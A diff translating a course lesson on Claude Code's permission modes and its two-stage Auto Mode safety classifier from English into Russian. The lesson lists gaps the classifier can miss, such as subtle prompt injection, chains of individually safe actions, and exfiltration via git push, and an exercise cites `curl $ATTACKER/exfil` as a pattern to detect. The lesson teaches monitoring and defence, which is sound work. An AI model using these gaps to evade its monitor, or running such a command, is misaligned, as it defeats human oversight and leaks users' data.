@@ -1,109 +1,109 @@
-# Claude Code as an Autonomous Agent: Permission Modes and Auto Mode
+# Claude Code как автономный агент: режимы разрешений и Auto Mode
 
-> Claude Code exposes seven permission modes. "plan" asks before every action, "default" asks only for risky ones, "acceptEdits" auto-approves file writes but still confirms shell execution, and "bypassPermissions" approves everything. Auto Mode (March 24, 2026) replaces per-action approval with a two-stage parallel safety classifier: a single-token fast check runs on every action; flagged actions kick off a chain-of-thought deep review. Action budgets are enforced via `max_turns` and `max_budget_usd`. Auto Mode shipped as a research preview — Anthropic has stated explicitly that the classifier is not sufficient alone.
+> Claude Code предоставляет семь режимов разрешений. "plan" спрашивает перед каждым действием, "default" спрашивает только для рискованных, "acceptEdits" автоматически одобряет запись файлов, но все еще подтверждает выполнение shell, а "bypassPermissions" одобряет все. Auto Mode (24 марта 2026) заменяет одобрение каждого действия двухэтапным параллельным классификатором безопасности: быстрая проверка на один токен запускается для каждого действия; отмеченные действия запускают глубокое chain-of-thought ревью. Бюджеты действий задаются через `max_turns` и `max_budget_usd`. Auto Mode был выпущен как research preview — Anthropic явно заявила, что одного классификатора недостаточно.
 
-**Type:** Learn
-**Languages:** Python (stdlib, two-stage classifier simulator)
-**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
-**Time:** ~45 minutes
+**Тип:** Обучение
+**Языки:** Python (stdlib, симулятор двухэтапного классификатора)
+**Предварительные требования:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
+**Время:** ~45 минут
 
-## The Problem
+## Проблема
 
-An autonomous coding agent on your machine is a distinct security category. The attack surface is everything the agent can reach — file system, network, credentials, clipboard, any browser tab, any open terminal. Bruce Schneier and others have flagged this publicly: computer-use agents are not a "feature update" of chatbots, they are a new kind of tool with a new kind of risk profile.
+Автономный coding agent на вашей машине — отдельная категория безопасности. Поверхность атаки — все, до чего агент может добраться: файловая система, сеть, credentials, буфер обмена, любая вкладка браузера, любой открытый терминал. Брюс Шнайер и другие публично отмечали это: computer-use agents — не «обновление функций» чатботов, а новый тип инструмента с новым профилем рисков.
 
-Claude Code's permission system is Anthropic's answer. Rather than one "autonomous / not autonomous" switch, there are seven modes spanning a capability ladder: plan → default → acceptEdits → … → bypassPermissions. Each mode is a different trade-off between speed and review-per-action. Auto Mode (March 2026) adds a two-stage classifier that moves approval off the user's critical path for actions the classifier judges safe, while preserving a review layer for actions the classifier flags.
+Система разрешений Claude Code — ответ Anthropic. Вместо одного переключателя «автономный / не автономный» есть семь режимов, образующих лестницу возможностей: plan → default → acceptEdits → … → bypassPermissions. Каждый режим — другой компромисс между скоростью и review-per-action. Auto Mode (март 2026) добавляет двухэтапный классификатор, который убирает одобрение с критического пути пользователя для действий, которые классификатор считает безопасными, сохраняя слой ревью для действий, которые классификатор отмечает.
 
-The engineering question: what does this system catch, what does it miss, and which mode does a given task actually warrant?
+Инженерный вопрос: что эта система ловит, что пропускает, и какой режим реально нужен для данной задачи?
 
-## The Concept
+## Концепция
 
-### The seven permission modes
+### Семь режимов разрешений
 
-| Mode | Behavior | When to use |
+| Режим | Поведение | Когда использовать |
 |---|---|---|
-| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
-| `default` | Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
-| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
-| `acceptExec` | Shell commands auto-approve within a curated allowlist; writes auto-approve | Tight inner loops where every shell command is `npm test` or similar |
-| `autoMode` | Two-stage safety classifier; flagged actions elevate to review | Long-horizon unattended runs in a constrained workspace |
-| `yolo` | Skips most prompts; still runs tool allowlist / denylist | Ephemeral sandboxes, CI jobs, research scripts |
-| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |
+| `plan` | Агент предлагает план; пользователь одобряет весь план; каждое действие проверяется перед выполнением | Незнакомая задача; код рядом с prod; первый запуск агента на репозитории |
+| `default` | Агент выполняет действия; запрашивает пользователя для любого «рискованного» действия (shell exec, destructive operations, network calls) | Большинство интерактивных coding sessions |
+| `acceptEdits` | Записи файлов автоодобряются; shell exec и network calls все еще требуют подтверждения | Проход рефакторинга по многим файлам |
+| `acceptExec` | Shell commands автоодобряются внутри curated allowlist; записи автоодобряются | Плотные inner loops, где каждая shell command — `npm test` или похожее |
+| `autoMode` | Двухэтапный safety classifier; отмеченные действия поднимаются на review | Долгие unattended runs в ограниченном workspace |
+| `yolo` | Пропускает большинство prompts; все еще применяет tool allowlist / denylist | Ephemeral sandboxes, CI jobs, research scripts |
+| `bypassPermissions` | Одобряет все | Документирован как «только внутри ephemeral containers, которые вы готовы выбросить» |
 
-(Names above match public Claude Code docs; "yolo" is the informal shorthand for the permissive middle ground.)
+(Имена выше соответствуют публичной документации Claude Code; "yolo" — неформальное сокращение для более разрешительного среднего режима.)
 
-### Auto Mode in one page
+### Auto Mode на одной странице
 
-Auto Mode (launched March 24, 2026) is the first permission mode to delegate per-action approval to a model. Structure:
+Auto Mode (запущен 24 марта 2026) — первый режим разрешений, который делегирует per-action approval модели. Структура:
 
-1. **Stage 1 — single-token classifier.** Runs on every proposed action. Cheap. Returns "safe" or "flag." Designed to run in parallel with the main agent loop so approved actions do not sit in a queue.
-2. **Stage 2 — secondary policy/safety review.** Runs only on flagged actions. Performs a focused policy and safety assessment over the action, the current state of the session, and the declared task. Escalates to user HITL if confidence is low.
+1. **Stage 1 — single-token classifier.** Запускается для каждого предложенного действия. Дешевый. Возвращает "safe" или "flag." Спроектирован для параллельного запуска с основным agent loop, чтобы одобренные действия не стояли в очереди.
+2. **Stage 2 — secondary policy/safety review.** Запускается только для отмеченных действий. Выполняет сфокусированную оценку policy и safety по действию, текущему состоянию сессии и заявленной задаче. Эскалирует к user HITL при низкой уверенности.
 
-Budget controls sit alongside the classifier:
+Контроли бюджета находятся рядом с классификатором:
 
-- `max_turns` — total iterations in a session.
-- `max_budget_usd` — dollar cap that aborts the session.
-- action-count limits per tool (no more than N `WebFetch` calls, etc.).
+- `max_turns` — общее число итераций в сессии.
+- `max_budget_usd` — долларовый лимит, который прерывает сессию.
+- лимиты числа действий на инструмент (не больше N вызовов `WebFetch` и т. д.).
 
-### What the system catches
+### Что система ловит
 
-- Straightforward prompt injection into tool inputs where the injected instruction maps to a known-risky action shape.
-- Repetitive tool loops — the classifier can see action N+1 is nearly identical to action N, five times in a row.
-- Clearly out-of-scope shell commands on an otherwise file-edit-only session.
+- Прямолинейный prompt injection во входах инструментов, где внедренная инструкция соответствует известной рискованной форме действия.
+- Повторяющиеся tool loops — классификатор видит, что действие N+1 почти идентично действию N, пять раз подряд.
+- Явно выходящие за scope shell commands в сессии, которая иначе предназначена только для редактирования файлов.
 
-### What the system can miss
+### Что система может пропустить
 
-- **Subtle prompt injection** that modulates behavior without producing a single flagged action. Indirect prompt injection is not a fully patchable vulnerability (OpenAI preparedness head, 2025, on browser agents — see Lesson 11).
-- **Semantic-level misbehavior.** Every individual action can look safe while the composed trajectory is harmful. The classifier judges the action; it does not re-derive the user's intent.
-- **Exfiltration through legitimate channels.** Writing data to a file you own, then `git push`ing to a public repo, is a sequence of allowed actions whose composition is the problem.
+- **Тонкий prompt injection**, который модулирует поведение без одного явно отмечаемого действия. Indirect prompt injection не является полностью исправимой уязвимостью (руководитель OpenAI preparedness, 2025, о browser agents — см. Lesson 11).
+- **Нарушения на семантическом уровне.** Каждое отдельное действие может выглядеть безопасным, пока составная траектория вредна. Классификатор судит действие; он не выводит заново намерение пользователя.
+- **Exfiltration через легитимные каналы.** Записать данные в принадлежащий вам файл, затем выполнить `git push` в публичный repo — последовательность разрешенных действий, проблема в их композиции.
 
-### Research preview framing
+### Рамка research preview
 
-Anthropic shipped Auto Mode as a research preview. The documentation is explicit that the classifier is a layer, not a solution: users are expected to combine Auto Mode with budgets, allowlists, isolated workspaces, and trajectory audits (Lessons 12–16). The preview framing also reflects the documented evaluation-vs-deployment gap (Lesson 1) — a classifier that passes offline evals can behave differently in a real session where the user's context is ambiguous.
+Anthropic выпустила Auto Mode как research preview. Документация явно говорит, что классификатор — слой, а не решение: ожидается, что пользователи будут сочетать Auto Mode с budgets, allowlists, isolated workspaces и trajectory audits (Lessons 12–16). Рамка preview также отражает задокументированный разрыв evaluation-vs-deployment (Lesson 1) — классификатор, который проходит offline evals, может вести себя иначе в реальной сессии, где контекст пользователя неоднозначен.
 
-### Where this ladder lives in your workflow
+### Где эта лестница живет в вашем workflow
 
-- Unfamiliar task: start in `plan`. Reading the plan is cheaper than rolling back a bad run.
-- Known refactor: `acceptEdits` saves a lot of confirmation clicks.
-- Unattended background run: `autoMode` only inside a workspace whose blast radius you have measured (no credentials, no production mounts, no egress you did not opt into).
-- Ephemeral containers: `yolo` / `bypassPermissions` is acceptable if and only if the container and its credentials are disposable.
+- Незнакомая задача: начинайте с `plan`. Прочитать план дешевле, чем откатывать плохой run.
+- Известный refactor: `acceptEdits` экономит много кликов подтверждения.
+- Unattended background run: `autoMode` только внутри workspace, чей blast radius вы измерили (нет credentials, нет production mounts, нет egress, который вы не включали).
+- Ephemeral containers: `yolo` / `bypassPermissions` приемлемы тогда и только тогда, когда container и его credentials одноразовые.
 
-## Use It
+## Использование
 
-`code/main.py` simulates the two-stage classifier. Stage 1 is a cheap keyword rule over proposed actions; Stage 2 is a slower multi-rule reviewer. The driver feeds in a short synthetic trajectory (safe actions, a prompt-injection attempt, a repetitive loop) and shows where the classifier catches and where it misses.
+`code/main.py` симулирует двухэтапный классификатор. Stage 1 — дешевое keyword rule по предложенным действиям; Stage 2 — более медленный multi-rule reviewer. Driver подает короткую синтетическую траекторию (безопасные действия, попытка prompt-injection, повторяющийся loop) и показывает, где классификатор ловит, а где пропускает.
 
-## Ship It
+## Результат
 
-`outputs/skill-permission-mode-picker.md` matches a task description to the right permission mode, budget caps, and required isolation.
+`outputs/skill-permission-mode-picker.md` сопоставляет описание задачи с правильным режимом разрешений, бюджетными лимитами и требуемой изоляцией.
 
-## Exercises
+## Упражнения
 
-1. Run `code/main.py`. Which synthetic action type is never flagged by Stage 1 but always caught by Stage 2? Which is caught by neither?
+1. Запустите `code/main.py`. Какой синтетический тип действий никогда не отмечается Stage 1, но всегда ловится Stage 2? Какой не ловится ни одним?
 
-2. Extend the Stage 1 rule set to catch a specific known-bad shape (e.g., `curl $ATTACKER/exfil`). Measure the false-positive rate on the benign-action sample.
+2. Расширьте набор правил Stage 1, чтобы ловить конкретную known-bad форму (например, `curl $ATTACKER/exfil`). Измерьте false-positive rate на образце benign-action.
 
-3. Read Anthropic's "How the agent loop works" doc. List every external state the agent touches by default in `default` mode. Which would you need to gate separately before running `autoMode` unattended?
+3. Прочитайте документ Anthropic "How the agent loop works". Перечислите каждое внешнее состояние, которого агент касается по умолчанию в режиме `default`. Что нужно gate отдельно перед unattended запуском `autoMode`?
 
-4. Design a 24-hour unattended run budget: `max_turns`, `max_budget_usd`, per-tool caps, allowlists. Justify each number.
+4. Спроектируйте бюджет 24-hour unattended run: `max_turns`, `max_budget_usd`, per-tool caps, allowlists. Обоснуйте каждое число.
 
-5. Describe one trajectory where every individual action is approved by Stage 1 and Stage 2, yet the composed behavior is misaligned. (Lesson 14 covers how kill switches and canary tokens address this.)
+5. Опишите одну траекторию, где каждое отдельное действие одобрено Stage 1 и Stage 2, но составное поведение невыровнено. (Lesson 14 покрывает, как kill switches и canary tokens решают это.)
 
-## Key Terms
+## Ключевые термины
 
-| Term | What people say | What it actually means |
+| Термин | Как обычно говорят | Что это на самом деле означает |
 |---|---|---|
-| Permission mode | "How much the agent can do" | One of seven named policies controlling per-action approval |
-| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
-| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
-| autoMode | "Auto approvals" | Two-stage safety classifier; flagged actions escalate |
-| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
-| Stage 1 classifier | "Fast token check" | Single-token rule over proposed action; runs in parallel |
-| Stage 2 classifier | "Deep review" | Chain-of-thought reasoning over flagged actions |
-| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |
+| Permission mode | «Сколько агент может делать» | Одна из семи именованных политик, управляющих одобрением каждого действия |
+| plan mode | «Спросить перед всем» | Агент пишет план; пользователь одобряет перед выполнением |
+| acceptEdits | «Разрешить записывать файлы» | Записи файлов автоодобряются; shell exec все еще требует подтверждения |
+| autoMode | «Автоодобрения» | Двухэтапный safety classifier; отмеченные действия эскалируются |
+| bypassPermissions | «Полный YOLO» | Одобряет все; предназначен для ephemeral containers |
+| Stage 1 classifier | «Быстрая token check» | Single-token rule по предложенному действию; запускается параллельно |
+| Stage 2 classifier | «Глубокое ревью» | Chain-of-thought reasoning по отмеченным действиям |
+| Research preview | «Не GA» | Рамка Anthropic для функций, чьи режимы отказа еще картируются |
 
-## Further Reading
+## Дополнительное чтение
 
-- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — permission modes, budgets, action format.
-- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — managed-service execution model.
-- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — feature surface and Auto Mode announcement.
-- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — the reason-based layer that shapes classifier judgments.
-- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — internal perspective on long-horizon permission design.
+- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — режимы разрешений, бюджеты, формат действий.
+- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — execution model управляемого сервиса.
+- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — поверхность возможностей и анонс Auto Mode.
+- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — reason-based слой, формирующий суждения классификатора.
+- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — внутренняя перспектива на long-horizon permission design.
